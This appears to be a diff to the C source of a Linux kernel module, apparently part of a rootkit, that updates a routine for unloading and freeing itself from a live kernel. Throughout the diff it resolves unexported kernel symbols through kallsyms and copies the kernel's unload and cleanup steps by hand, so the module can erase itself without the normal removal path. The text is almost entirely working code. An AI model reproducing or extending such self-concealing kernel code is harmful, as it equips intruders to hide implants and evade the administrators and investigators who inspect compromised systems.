@@ -13,7 +13,7 @@ extern void rooti_self_deallocate(struct work_struct *work);
 DECLARE_WORK(rooti_self_deallocate_work, rooti_self_deallocate);
 
 typedef void (*free_module_t)(struct module *);
-free_module_t __free_module = NULL;
+free_module_t free_module_ptr = NULL;
 struct module *this_module_ptr = THIS_MODULE;
 
 static int __try_release_module_ref(struct module *mod)
@@ -34,31 +34,38 @@ static int __try_release_module_ref(struct module *mod)
 static int rooti_schedule_self_unloading(void) {
 	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
 	ROOTI_RESOLVE_SYM_ADDR(struct blocking_notifier_head *, module_notify_list, -ENOENT);
+	ROOTI_RESOLVE_FUNC_ADDR(klp_module_going, -ENOENT, void, struct module *);
+	ROOTI_RESOLVE_FUNC_ADDR(ftrace_release_mod, -ENOENT, void, struct module *);
 
 	mutex_lock(__module_mutex);
 
 	// Check if by chance other modules depend on us (this should never happen in a non-debug build)
 	if (!list_empty(&THIS_MODULE->source_list)) {
+		mutex_unlock(__module_mutex);
 		ROOTI_DEBUG("other modules depend on this module, cannot unload safely");
 		return -EWOULDBLOCK;
 	}
 
 	// Checking if the module is during initialization or already dying
 	if (THIS_MODULE->state != MODULE_STATE_LIVE) {
+		mutex_unlock(__module_mutex);
 		ROOTI_DEBUG("module is during initialization or already dying");
 		return -EBUSY;
 	}
-
-	// TODO: maybe call try_stop_module itself ?
-	__try_release_module_ref(THIS_MODULE);
+	// Inlined try_stop_module() function
+	if (__try_release_module_ref(THIS_MODULE) != 0) {
+		mutex_unlock(__module_mutex);
+		return -EWOULDBLOCK;
+	}
 	THIS_MODULE->state = MODULE_STATE_GOING;
 
 	mutex_unlock(__module_mutex);
 	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
 	THIS_MODULE->exit();
 
-	// TODO: klp_module_going(mod)
-	// TODO: ftrace_release_mod(mod)
+	// ftrace & livepatch related cleanup
+	__klp_module_going(THIS_MODULE);
+	__ftrace_release_mod(THIS_MODULE);
 
 	async_synchronize_full();
 
@@ -72,10 +79,7 @@ static int rooti_schedule_self_unloading(void) {
 
 int rooti_schedule_self_deletion()
 {
-	__free_module = (free_module_t)__kallsyms_lookup_name("free_module");
-	if (__free_module == NULL) {
-		ROOTI_DEBUG("unresolved symbol 'free_module'");
-		return -ENOENT;
-	}
+	ROOTI_RESOLVE_SYM_ADDR(free_module_t, free_module, -ENOENT);
+	free_module_ptr = __free_module;
 	return rooti_schedule_self_unloading();
 }
